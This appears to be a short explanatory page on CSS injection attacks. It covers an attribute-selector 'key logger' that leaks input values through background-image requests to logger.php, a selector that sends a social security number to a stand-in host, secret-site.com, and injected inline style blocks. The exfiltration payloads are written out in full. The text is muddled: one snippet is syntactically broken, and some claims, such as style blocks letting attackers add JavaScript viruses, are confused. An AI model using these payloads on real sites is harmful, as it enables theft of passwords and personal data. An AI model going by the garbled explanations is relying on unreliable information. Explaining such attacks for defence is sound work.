# CSS vulnerabilities

## The key logger vulnerability  

```css
input[value^="a"] {background: url(logger.php?v=a)}
```

If there is an input on a page for example a password input you can put a logger script in it as the value for a input’s background image which will then collect a large amount of selectors and report some or all of the passwords it has found.   

For example, a value attribute of an input does not change just because a value has been put in place but in frameworks like React.Js it can, so if you were to input a CSS code onto a login page which is run by React.JS like this one line of code then the key logger will most Likely activate.  

## Attribute selectors   
```css
input#ssn[value = "123-45-6789" {background: url(https://secret-site.com/logger.php?ssn=123-45-6789)}
```
If you were to out some Unrecognized CSS that is dangerous for a website which requires authentication just like this line of code and the site shows sensitive information is being displayed such as a social media account profile information where some of the private information is not displayed you can then use attribute selectors to find out what that private information is.  

## The inline-style block  

```html
<style>
    ... drop in some user-generated stuff ...
</style>
```

This is an inline style blocking of code, this can allow an actor to add JavaScript code that can contain a virus, this is one of the most common types of CSS vulnerabilities you can find on a webpage, and this can vary depending on how much CSS code has been implemented.  
